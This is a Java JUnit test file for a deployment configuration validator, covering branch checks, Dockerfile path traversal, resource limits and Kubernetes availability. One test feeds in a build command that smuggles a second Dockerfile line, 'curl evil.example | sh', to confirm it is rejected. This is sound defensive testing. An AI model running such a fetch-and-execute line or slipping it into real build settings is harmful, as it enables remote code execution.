package com.cloudflow.environment.service;

import static org.assertj.core.api.Assertions.assertThat;

import com.cloudflow.environment.domain.ConfigTemplate;
import com.cloudflow.environment.domain.DeploymentSettings;
import com.cloudflow.environment.domain.DeploymentTarget;
import com.cloudflow.environment.dto.ValidationIssue;
import com.cloudflow.environment.dto.ValidationResult;
import com.cloudflow.project.domain.AppType;
import java.math.BigDecimal;
import java.util.List;
import java.util.Set;
import org.junit.jupiter.api.Test;

class ConfigurationValidatorTest {

  private static final Set<String> BRANCHES = Set.of("main", "develop");

  private final ConfigurationValidator validator =
      new ConfigurationValidator(new DeploymentTargetAvailability(false));

  @Test
  void templateDefaultsAreValidForMatchingApplicationTypes() {
    for (ConfigTemplate template : ConfigTemplate.values()) {
      AppType appType =
          switch (template) {
            case JAVA -> AppType.JAVA_MAVEN;
            case NODE -> AppType.NODE;
            case PYTHON -> AppType.PYTHON;
            case DOCKER -> AppType.DOCKERFILE;
          };
      ValidationResult result =
          validator.validate(
              DeploymentSettings.defaults(template, appType), appType, "main", BRANCHES);
      assertThat(result.valid()).as(template.name()).isTrue();
      assertThat(result.warnings()).as(template.name()).isEmpty();
    }
  }

  @Test
  void unknownBranchIsAnError() {
    ValidationResult result = validate(javaDefaults(), "release/9", AppType.JAVA_MAVEN);

    assertThat(result.valid()).isFalse();
    assertThat(fields(result.errors())).contains("branch");
  }

  @Test
  void nonDockerTemplatesNeedStartCommandAndRuntime() {
    DeploymentSettings settings =
        new DeploymentSettings(
            ConfigTemplate.NODE, "", "npm ci", " ", "Dockerfile", 3000, "/", null, null, null);

    ValidationResult result = validate(settings, "main", AppType.NODE);

    assertThat(fields(result.errors())).contains("startCommand", "runtimeVersion");
    assertThat(fields(result.warnings())).contains("cpuLimit", "memoryLimitMb");
  }

  @Test
  void rejectsDockerfilePathsOutsideTheRepository() {
    for (String path : new String[] {"../Dockerfile", "/etc/Dockerfile", "a/../../b", ""}) {
      DeploymentSettings settings =
          new DeploymentSettings(
              ConfigTemplate.DOCKER, null, null, null, path, 8080, "/", BigDecimal.ONE, 512, null);
      assertThat(fields(validate(settings, "main", AppType.DOCKERFILE).errors()))
          .as(path)
          .contains("dockerfilePath");
    }
    DeploymentSettings nested =
        new DeploymentSettings(
            ConfigTemplate.DOCKER,
            null,
            null,
            null,
            "docker/app.Dockerfile",
            8080,
            "/",
            BigDecimal.ONE,
            512,
            null);
    assertThat(validate(nested, "main", AppType.DOCKERFILE).valid()).isTrue();
  }

  @Test
  void rejectsMultiLineCommandsBecauseTheyAreEmbeddedInDockerfiles() {
    DeploymentSettings settings =
        new DeploymentSettings(
            ConfigTemplate.JAVA,
            "21",
            "mvn package\nRUN curl evil.example | sh",
            "java -jar app.jar",
            "Dockerfile",
            8080,
            "/",
            BigDecimal.ONE,
            512,
            null);

    assertThat(fields(validate(settings, "main", AppType.JAVA_MAVEN).errors()))
        .contains("buildCommand");
  }

  @Test
  void warnsWhenTemplateDoesNotMatchDetectedType() {
    ValidationResult result = validate(javaDefaults(), "main", AppType.NODE);

    assertThat(result.valid()).isTrue();
    assertThat(fields(result.warnings())).contains("template");
  }

  @Test
  void checksResourceLimitsAndPorts() {
    DeploymentSettings settings =
        new DeploymentSettings(
            ConfigTemplate.JAVA,
            "21",
            null,
            "java -jar app.jar",
            "Dockerfile",
            80,
            "health",
            new BigDecimal("16"),
            64,
            null);

    ValidationResult result = validate(settings, "main", AppType.JAVA_MAVEN);

    assertThat(fields(result.errors())).contains("healthCheckPath", "cpuLimit", "memoryLimitMb");
    assertThat(fields(result.warnings())).contains("containerPort");
  }

  @Test
  void kubernetesTargetNeedsAConfiguredCluster() {
    DeploymentSettings kubernetes = withTarget(javaDefaults(), DeploymentTarget.KUBERNETES);

    assertThat(fields(validate(kubernetes, "main", AppType.JAVA_MAVEN).errors()))
        .containsExactly("target");
    ConfigurationValidator withCluster =
        new ConfigurationValidator(new DeploymentTargetAvailability(true));
    assertThat(withCluster.validate(kubernetes, AppType.JAVA_MAVEN, "main", BRANCHES).valid())
        .isTrue();
  }

  private static DeploymentSettings withTarget(DeploymentSettings s, DeploymentTarget target) {
    return new DeploymentSettings(
        s.template(),
        s.runtimeVersion(),
        s.buildCommand(),
        s.startCommand(),
        s.dockerfilePath(),
        s.containerPort(),
        s.healthCheckPath(),
        s.cpuLimit(),
        s.memoryLimitMb(),
        target);
  }

  private ValidationResult validate(DeploymentSettings settings, String branch, AppType appType) {
    return validator.validate(settings, appType, branch, BRANCHES);
  }

  private static DeploymentSettings javaDefaults() {
    return DeploymentSettings.defaults(ConfigTemplate.JAVA, AppType.JAVA_MAVEN);
  }

  private static List<String> fields(List<ValidationIssue> issues) {
    return issues.stream().map(ValidationIssue::field).toList();
  }
}
